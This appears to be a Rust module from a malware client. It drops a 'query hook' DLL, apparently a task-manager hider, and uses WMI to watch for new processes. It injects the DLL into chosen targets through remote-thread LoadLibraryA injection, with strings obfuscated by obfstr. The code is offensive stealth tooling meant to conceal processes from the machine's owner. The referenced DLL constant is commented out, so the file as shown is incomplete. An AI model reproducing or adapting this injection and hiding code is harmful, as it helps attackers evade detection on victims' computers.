use std::{ path::PathBuf, sync::Mutex };
use obfstr::obfstr as s;
use client_vars::constants::{
    default_query_hook_exclusions,
    query_hook_dll_name,
    query_hook_exclusions_file_path,
    query_hook_processes,
};
use shared::ref_log_internal;
use shared::{ logs::logger::Logger, ref_info, utils::functions::get_current_exe_dir };
use tokio::{ fs::{ create_dir_all, File }, io::AsyncWriteExt };
use anyhow::{ Context, Result };
use std::{ os::windows::process::CommandExt, process::Command };
use winreg::enums::*;
use winreg::RegKey;
use serde::{ Deserialize, Serialize };
use winapi::shared::ntdef::LPSTR;
use winapi::shared::windef::{ HWND, RECT };
use winapi::um::winuser::{ GetForegroundWindow, GetWindowTextA, GetWindowTextLengthA };
use std::io::{ Cursor, Write };
// use screenshots::Screen;
// use screenshots::image;
use std::ffi::CString;
use std::ptr::null_mut;
use winapi::shared::minwindef::DWORD;
use winapi::um::handleapi::CloseHandle;
use winapi::um::libloaderapi::GetModuleHandleA;
use winapi::um::memoryapi::VirtualAllocEx;
use winapi::um::processthreadsapi::{ CreateRemoteThread, OpenProcess };
use winapi::um::winnt::{ MEM_COMMIT, PAGE_READWRITE, PROCESS_ALL_ACCESS };
use wmi::{ COMLibrary, WMIConnection };
use wmi::query::FilterValue;
use std::collections::HashMap;
use std::time::Duration;

// const QUERY_HOOK_DLL_BYTES: &[u8] = include_bytes!(
//     "../../../task-manager-hider-master/x64/Release/TaskManagerHack.dll"
// );

#[derive(Deserialize, Debug)]
#[serde(rename = "Win32_Process")]
#[serde(rename_all = "PascalCase")]
struct Process {
    process_id: u32,
    name: String,
    executable_path: Option<String>,
}

#[derive(Deserialize, Debug)]
#[serde(rename = "__InstanceCreationEvent")]
#[serde(rename_all = "PascalCase")]
struct NewProcessEvent {
    target_instance: Process,
}

async fn setup_query_hooker_list() -> Result<()> {
    let file_path = query_hook_exclusions_file_path();
    if let Some(dir_path) = file_path.parent().take() {
        create_dir_all(&dir_path).await?;
    }

    if file_path.exists() && file_path.is_file() {
        return Ok(());
    } else {
        File::create(&file_path).await?;

        let default_exclusions = default_query_hook_exclusions();
        let updated_content = default_exclusions.join(";");

        let mut file = tokio::fs::OpenOptions
            ::new()
            .write(true)
            .truncate(true)
            .open(&file_path).await?;

        file.write_all(updated_content.as_bytes()).await?;
        return Ok(());
    }
}

pub async fn write_dll_bytes() -> Result<PathBuf> {
    let dll_path = get_current_exe_dir().join(query_hook_dll_name());
    if !dll_path.exists() {
        let mut file = File::create(dll_path.clone()).await?;
        file.write_all(QUERY_HOOK_DLL_BYTES).await?;
    }

    Ok(dll_path)
}
pub async fn run_query_hooker() -> Result<()> {
    setup_query_hooker_list().await?;

    let dll_path = write_dll_bytes().await?;

    let com_con = COMLibrary::new()?;
    let wmi_con = WMIConnection::new(com_con)?;

    let mut filters = HashMap::<String, FilterValue>::new();
    filters.insert(s!("TargetInstance").to_owned(), FilterValue::is_a::<Process>()?);

    let iterator = wmi_con.filtered_notification::<NewProcessEvent>(
        &filters,
        Some(Duration::from_millis(300))
    )?;
    let target_processes = query_hook_processes();

    for result in iterator {
        let process = result?.target_instance;
        if target_processes.contains(&process.name.to_lowercase()) {
            // ref_info!(logger, "new process to be injected, name: ", process.name);
            // ref_info!(logger, "query hook dll onto PID: ", process.process_id);

            inject_dll(process.process_id, dll_path.to_str().unwrap())?;
        }
    }

    Ok(())
}

pub fn inject_dll(pid: DWORD, dll_path: &str) -> Result<()> {
    let dll_path_cstring = match CString::new(dll_path.to_string()) {
        Ok(cstring) => cstring,
        Err(err) => {
            return Err(
                anyhow::anyhow!(format!("{}{}", s!("Failed to create CString for DLL path: "), err))
            );
        }
    };

    unsafe {
        let process = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
        if process.is_null() {
            return Err(anyhow::anyhow!(format!("{}", s!("Failed to open the target process"))));
        }

        let addr = VirtualAllocEx(
            process,
            null_mut(),
            dll_path_cstring.to_bytes_with_nul().len(),
            MEM_COMMIT,
            PAGE_READWRITE
        );
        if addr.is_null() {
            CloseHandle(process);
            return Err(
                anyhow::anyhow!(
                    format!("{}", s!("Failed to allocate memory in the target process"))
                )
            );
        }

        if
            winapi::um::memoryapi::WriteProcessMemory(
                process,
                addr,
                dll_path_cstring.as_ptr() as *const _,
                dll_path_cstring.to_bytes_with_nul().len(),
                null_mut()
            ) == 0
        {
            CloseHandle(process);
            return Err(
                anyhow::anyhow!(format!("{}", s!("Failed to write into the target process memory")))
            );
        }

        let kernel32 = match CString::new("kernel32.dll") {
            Ok(cstring) => cstring,
            Err(err) => {
                CloseHandle(process);
                return Err(
                    anyhow::anyhow!(
                        format!("{}{}", s!("Failed to create CString for kernel32.dll: "), err)
                    )
                );
            }
        };

        let h_kernel32 = GetModuleHandleA(kernel32.as_ptr());
        if h_kernel32.is_null() {
            CloseHandle(process);
            return Err(
                anyhow::anyhow!(format!("{}", s!("Failed to get the handle of kernel32.dll")))
            );
        }

        let loadlibrarya = match CString::new("LoadLibraryA") {
            Ok(cstring) => cstring,
            Err(err) => {
                CloseHandle(process);
                return Err(
                    anyhow::anyhow!(
                        format!("{}{}", s!("Failed to create CString for LoadLibraryA: "), err)
                    )
                );
            }
        };

        let h_loadlibrarya = winapi::um::libloaderapi::GetProcAddress(
            h_kernel32,
            loadlibrarya.as_ptr()
        );
        if h_loadlibrarya.is_null() {
            CloseHandle(process);
            return Err(
                anyhow::anyhow!(format!("{}", s!("Failed to get the address of LoadLibraryA")))
            );
        }

        if
            CreateRemoteThread(
                process,
                null_mut(),
                0,
                Some(std::mem::transmute(h_loadlibrarya)),
                addr as *mut _,
                0,
                null_mut()
            ).is_null()
        {
            CloseHandle(process);
            return Err(
                anyhow::anyhow!(
                    format!("{}", s!("Failed to create a remote thread in the target process"))
                )
            );
        }

        CloseHandle(process);
    }

    Ok(())
}
